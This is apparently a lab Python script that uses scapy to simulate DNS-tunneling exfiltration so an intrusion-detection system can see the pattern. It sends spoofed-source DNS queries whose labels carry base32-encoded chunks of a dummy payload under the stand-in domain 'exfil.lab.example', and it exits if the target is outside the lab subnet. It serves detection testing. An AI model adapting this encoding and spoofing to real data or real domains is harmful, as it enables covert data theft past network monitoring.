#!/usr/bin/env python3
"""Lab DNS-tunneling simulation (scenario 4).

Generates the traffic *pattern* of DNS exfiltration: a burst of DNS queries
whose labels are long base32-encoded chunks of data, under a fake domain. It
does not contact a real resolver or move real data — the packets are sent on the
lab network so the capture/IDS can see the pattern. Source is spoofed to
172.30.0.80 so it groups into its own incident.

Hardcoded to lab addresses.
"""
import base64
import sys
import time

from scapy.all import DNS, DNSQR, IP, UDP, send

LAB_PREFIX = "172.30.0."
DEST = "172.30.0.21"        # any lab host; it need not answer
SPOOFED_SRC = "172.30.0.80"
DOMAIN = "exfil.lab.example"
QUERIES = 12

if not DEST.startswith(LAB_PREFIX):
    sys.exit(f"refusing: {DEST} is outside the lab network {LAB_PREFIX}0/24")

print(f"[*] simulating DNS tunneling: {QUERIES} encoded queries to *.{DOMAIN}")
print(f"[*] spoofed source {SPOOFED_SRC} -> {DEST}:53")

fake_payload = b"lab-demo-exfil-" + b"A" * 40
for i in range(QUERIES):
    chunk = fake_payload[i * 4 : i * 4 + 24] or b"end"
    label = base64.b32encode(chunk).decode().rstrip("=").lower()
    qname = f"{label}.{i:02d}.{DOMAIN}"
    pkt = IP(src=SPOOFED_SRC, dst=DEST) / UDP(sport=40000 + i, dport=53) / DNS(
        rd=1, qd=DNSQR(qname=qname)
    )
    send(pkt, verbose=False)
    print(f"    query {i + 1:2d}/{QUERIES}: {qname[:48]}...")
    time.sleep(0.2)

print("[+] done")
